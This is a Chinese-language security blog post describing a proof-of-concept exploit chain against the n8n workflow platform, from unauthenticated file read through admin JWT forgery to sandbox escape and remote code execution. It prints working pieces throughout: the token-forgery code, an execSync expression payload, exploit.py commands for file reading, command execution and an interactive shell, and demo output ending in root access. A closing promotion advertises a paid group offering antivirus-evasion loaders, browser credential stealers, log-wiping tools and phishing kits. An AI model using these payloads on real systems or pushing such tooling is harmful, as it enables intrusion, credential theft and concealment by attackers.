#  n8n Ni8mare - 未经认证的任意文件读取到远程代码执行链 (CVSS 10.0)  
原创 星夜AI安全  星夜AI安全   2026-01-09 01:26  
  
📌各位可以将公众号设为星标⭐  
  
📌这样就不会错过每期的推荐内容啦~  
  
📌这对我真的很重要！  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/SffY5ZO3R2lAVT6CicZmYO3GGZre7KEwxiaouHrUbg3rQ0UUVhEI7eDxct12pq4ITqI98fcU1rsJXlHib3VF1n4ew/640?wx_fmt=png&from=appmsg "image")  
  
📌1. 本平台分享的安全知识和工具信息源于公开资料及专业交流，仅供个人学习提升安全意识、了解防护手段，禁止用于任何违法活动，否则使用者自行承担法律后果。  
  
📌2. 所分享内容及工具虽具普遍性，但因场景、版本、系统等因素，无法保证完全适用，使用者要自行承担知识运用不当、工具使用故障带来的损失。  
  
📌3. 使用者在学习操作过程中务必遵守法规道德，面对有风险环节需谨慎预估后果、做好防护，若未谨慎操作引发信息泄露、设备损坏等不良后果，责任自负。  
  
**威胁简报**  
  
**恶意软件**  
  
**漏洞攻击**  
  
**CVE-2026-21858 与 CVE-2025-68613 - n8n 全链漏洞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taeLiaWUqiaMTaTDExNN8CosK6WIoibMmeEYiaGM9ziaGgR2MVMO9dx62YcmhHRNHFwibmZy2rQJhaUIgibrg/640?wx_fmt=jpeg&from=appmsg "")  
  
攻击路径：未经身份验证的任意文件读取 → 伪造管理员令牌 → 绕过沙箱 → 实现远程代码执行  
<table><thead><tr><th align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">CVE 编号</span></strong></th><th align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">CVE-2026-21858（任意文件读取）与 CVE-2025-68613（远程代码执行）</span></section></th></tr></thead><tbody><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">CVSS 评分</span></strong></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">10.0 与 9.9（均为危急级别）</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">受影响版本</span></strong></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">≤ 1.65.0（任意文件读取）/ ≥ 0.211.0（远程代码执行）</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">已修复版本</span></strong></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">1.121.0（任意文件读取）/ 1.120.4 及以上（远程代码执行）</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">披露时间</span></strong></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">2026年1月7日 11:09 UTC</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">代号</span></strong></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">Ni8mare</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">致谢</span></strong></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">Dor Atias（Cyera）</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">开发</span></strong></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">Chocapikk</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">过程</span></strong></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">AI自动化流程：补丁差异分析 → 漏洞复现 → 环境搭建 → 利用程序开发（披露后约9小时完成）</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">类型</span></strong></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">概念验证 - 非通用漏洞利用程序（需特定工作流配置，详见“限制”部分）</span></section></td></tr></tbody></table>  
针对 n8n 的完整未经认证远程代码执行链：  
- **CVE-2026-21858**  
 - 内容类型混淆 → 任意文件读取  
  
- 读取配置文件与数据库 → 伪造管理员 JWT 令牌  
  
- **CVE-2025-68613**  
 - 表达式注入 → 沙箱绕过 → 远程代码执行  
  
**开发此漏洞利用程序的原因**  
  
此利用程序的开发独立于 Cyera 发布的文档（在 Cyera 文档完成后才被发现）。主要差异如下：  
<table><thead><tr><th align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">Cyera（原创研究）</span></strong></th><th align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">本漏洞利用程序</span></strong></th></tr></thead><tbody><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">文件读取方式</span></strong></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">加载至AI知识库 → 通过聊天查询</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">前提条件</span></strong></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">需配置聊天工作流及 AI 集成</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">RCE 方法</span></strong></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">“执行命令”节点（默认禁用）</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">自动化程度</span></strong></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">手动/概念演示</span></section></td></tr></tbody></table>  
**攻击链概览**  
```
┌───────────────────────────────────────────────────────────┐│ 未经认证阶段 │├───────────────────────────────────────────────────────────┤│ 1. 读取 /proc/self/environ → 定位 HOME 目录 ││ 2. 读取 $HOME/.n8n/config → 获取 encryptionKey ││ 3. 读取 $HOME/.n8n/database.sqlite → 获取管理员凭据 │├───────────────────────────────────────────────────────────┤│ 令牌伪造阶段 │├───────────────────────────────────────────────────────────┤│ 4. 从 encryptionKey 派生 JWT 密钥 ││ 5. 伪造管理员会话 Cookie │├───────────────────────────────────────────────────────────┤│ 认证后 RCE 阶段 │├───────────────────────────────────────────────────────────┤│ 6. 创建包含表达式注入的工作流 ││ 7. 通过 this.process.mainModule.require 绕过沙箱 ││ 8. 执行任意命令 │└───────────────────────────────────────────────────────────┘
```  
  
**CVE-2026-21858 - 通过内容类型混淆实现任意文件读取**  
  
**补丁详情**  
```
commit c8d604d2c466dd84ec24f4f092183d86e43f2518Author: mfsiegaDate: Thu Nov 1311:51:402025 +0100    Mergecommitfrom fork
```  
  
经典的“合并来自分支的提交”——看到这个，通常意味着有人发现了有趣的东西。🌶️  
  
**根本原因**  
```
// 修复前（存在漏洞）const files = (context.getBodyData().files as IDataObject) ?? {};await context.nodeHelpers.copyBinaryFile(file.filepath, ...)// 修复后a.ok(req.contentType === 'multipart/form-data', 'Expected multipart/form-data');
```  
  
通过发送 Content-Type: application/json  
 可控制 filepath  
 参数，进而读取任意文件。  
  
**CVE-2025-68613 - 表达式注入导致的远程代码执行**  
  
**为何选择此路径？**  
  
n8n 沙箱使用 vm2  
 / isolated-vm  
 封装用户代码（代码节点、表达式）。其他潜在的 RCE 向量：  
<table><thead><tr><th align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">技术</span></section></th><th align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">状态</span></section></th></tr></thead><tbody><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">执行命令节点</span></section></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">默认禁用（</span><code><span leaf="">N8N_ALLOW_EXEC_COMMAND=false</span></code><span leaf="">）</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">SSH/HTTP 节点</span></section></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">在远程服务器上执行，而非 n8n 主机。</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">Pyodide 沙箱逃逸</span></section></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">CVE-2025-68668 - 需要 Python 代码节点</span></section></td></tr><tr><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">表达式注入</span></strong></td><td align="left" style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">CVE-2025-68613 - 在默认安装中有效</span></strong></td></tr></tbody></table>  
选择表达式注入是因为它适用于任何默认配置的 n8n 实例——无需特殊节点或额外配置。Pyodide 绕过方法 (CVE-2025-68668) 需要 Python 代码节点，而该节点并非所有实例都具备。  
  
**有效载荷示例**  
```
={{ (function(){   varrequire = this.process.mainModule.require;   var execSync = require("child_process").execSync;   return execSync("id").toString(); })() }}
```  
  
n8n 表达式可以访问 this.process.mainModule.require  
，从而实现完全的沙箱逃逸。  
  
**令牌伪造**  
```
# JWT 密钥派生jwt_secret = sha256(encryption_key[::2]).hexdigest()# JWT 哈希值计算jwt_hash = b64encode(sha256(f"{email}:{password_hash}")).decode()[:10]# 伪造令牌token = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256")
```  
  
**实验室环境搭建**  
```
docker compose up -d# 等待约60秒完成设置# 表单地址：http://localhost:5678/form/vulnerable-form# 默认凭据：admin@exploit.local / password
```  
  
**使用方法**  
```
# 读取任意文件uv run python exploit.py http://localhost:5678 /form/vulnerable-form --read /etc/passwd# 执行完整攻击链并运行命令uv run python exploit.py http://localhost:5678 /form/vulnerable-form --cmd "id"# 启动交互式 Shelluv run python exploit.py http://localhost:5678 /form/vulnerable-form
```  
  
**演示**  
```
╔═══════════════════════════════════════════════════════════════╗║ CVE-2026-21858 + CVE-2025-68613 - n8n 全链漏洞利用 ║║ 任意文件读取 → 令牌伪造 → 沙箱绕过 → 远程代码执行 ║╚═══════════════════════════════════════════════════════════════╝```[*] 目标: http://localhost:5678/form/vulnerable-form[*] 版本: 1.65.0 (VULN)[x] HOME 目录[+] HOME 目录: /root[x] 加密密钥[+] 加密密钥: yusrXZV1...[x] 数据库[+] 数据库: 1327104 字节[x] 管理员用户[+] 管理员用户: admin@exploit.local[x] 令牌伪造[+] 令牌伪造: 成功[x] 管理员访问权限[+] 管理员访问权限: 已授权！[+] Cookie: n8n-auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjljMWI5MzU0LTI5NzQtNGZlOS05OTc2LWVmZDM3ZWEyNWFlMiIsImhhc2giOiJGYzVQZjVkUDRxIn0.TrIjHV3_6pw6Syi4qme5larZeQElBJmo4Y_eSgL9_M0[x] 远程代码执行 (RCE)[+] 远程代码执行 (RCE): 成功uid=0(root) gid=0(root) groups=0(root)## 局限性这个工具并非能“轻松攻破任何网络”的漏洞利用程序。它需要满足一些特定条件才能发挥作用：| 要求 | 描述 || :--- | :--- || **包含文件上传功能的表单** | 目标必须包含一个配置了文件上传字段的表单工作流。 || **Webhook 响应节点** | 工作流必须通过 HTTP 响应来返回文件内容。 || **工作流已激活** | 表单工作流程必须处于激活状态。 || **无需身份验证的访问** | 表单必须可以公开访问，无需进行身份验证。 |### 易受攻击的工作流配置示例：```json{  "nodes": [    {      "name": "Form Trigger",      "type": "n8n-nodes-base.formTrigger",      "parameters": {        "responseMode": "responseNode",        "formFields": {          "values": [{ "fieldLabel": "document", "fieldType": "file" }]        }      }    },    {      "name": "Respond",      "type": "n8n-nodes-base.respondToWebhook",      "parameters": {        "respondWith": "binary",        "inputDataFieldName": "document"      }    }  ],  "connections": {    "Form Trigger": { "main": [[{ "node": "Respond" }]] }  }}
```  
  
关键要素是：fieldType: "file"  
 加上 respondWith: "binary"  
。这种模式在文件处理工作流（如转换器、图像调整器、文档处理器）中相当常见。  
### 适用场景：  
- 返回二进制数据的响应节点表单（例如文件转换器、处理器）。  
  
- 默认的 n8n 安装（表达式注入未被阻止）。  
  
- 本地或 Docker 部署（数据库和配置存储在磁盘上）。  
  
### 不适用场景：  
- 没有配置响应节点的表单（文件虽然可以被读取，但无法通过 HTTP 响应返回内容）。  
  
- 需要身份验证才能访问的表单。  
  
- n8n 云服务（架构不同，无法访问本地文件系统）。  
  
- 已经打过补丁的版本（版本号 >= 1.121.0）。  
  
- **注意**  
：无论采用何种数据泄露方法，都会触发此漏洞（任意文件读取）。响应节点只是获取内容的一种方式。根据工作流的具体配置，其他方法（例如使用其他输出节点）也可能有效。  
  
- **盲攻击**  
：如果不存在响应节点，n8n 仍然可以读取文件，但无法通过 HTTP 响应提取数据。此时需要采用其他技术（例如带外攻击、时序攻击）。  
  
项目地址： https://github.com/Chocapikk/CVE-2026-21858  
  
关注微信公众号后台回复**入群**  
 即可加入星夜AI安全交流群  
  
## 圈子介绍  
  
现任职于某头部网络安全企业攻防研究部，核心红队成员。2021-2023年间累计参与40+场国家级、行业级攻防实战演练，精通漏洞挖掘、红蓝对抗策略制定、恶意代码分析、内网横向渗透及应急响应等技术领域。在多次大型演练中，主导突破多个高防护目标网络，曾获“最佳攻击手”“突出贡献个人”等荣誉。  
  
已产出的安全工具及成果包括：  
- 多款主流杀软通杀工具（兼容卡巴斯基、诺顿、瑞星、360等终端防护）  
  
- 全自动信息收集平台（集成资产测绘、端口扫描、指纹识别及漏洞探针）  
  
- 内网穿透套件（适配多层路由、隔离网络环境的隐蔽流量转发）  
  
- 权限维持工具集（含注册表、系统服务、进程隐藏等多维持久化方案）  
  
- 哥斯拉/冰蝎定制化马生成器（绕过主流终端防护与EDR动态检测）  
  
- 日志清理工具（实现Windows/Linux系统关键日志无痕删除与篡改）  
  
- 浏览器凭证窃取工具（支持Chrome/Edge/Firefox等主流浏览器数据提取）  
  
- 企业VPN漏洞利用工具（适配多款商用VPN设备的漏洞探测与利用）  
  
- 工控系统专用扫描器（针对SCADA、PLC等工控设备的安全检测与指纹识别）  
  
- 邮件钓鱼平台（集成模板生成、钓鱼追踪、数据统计全流程功能）  
  
- 社工信息聚合工具（整合多平台公开信息检索与关联分析能力）  
  
- 二开fscan内网扫描工具（增强指纹精度、弱口令爆破与结果标准化输出）  
  
- 多款免杀Webshell集合（覆盖PHP/JSP/ASPX，过主流WAF与终端防护）  
  
- 免杀360专属加载器（支持Shellcode内存执行，绕过360全系防护检测）  
  
后续将不断更新到内部圈子中 欢迎加入圈子   
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/SffY5ZO3R2lc284s2DCkicS01oOTBgn0ibHfrZYqecKYJytVNXGaT0AW5rzt1icfNnic0710kwF8gyxU6lVffVUytg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/SffY5ZO3R2lc284s2DCkicS01oOTBgn0ibiaEF7u97By6Y3hicAYbVFcO60ib5T2DDEGAdsibuqF5plSaGqrSUGFriaVQ/640?wx_fmt=jpeg&from=appmsg "")  
```
```  
  
  
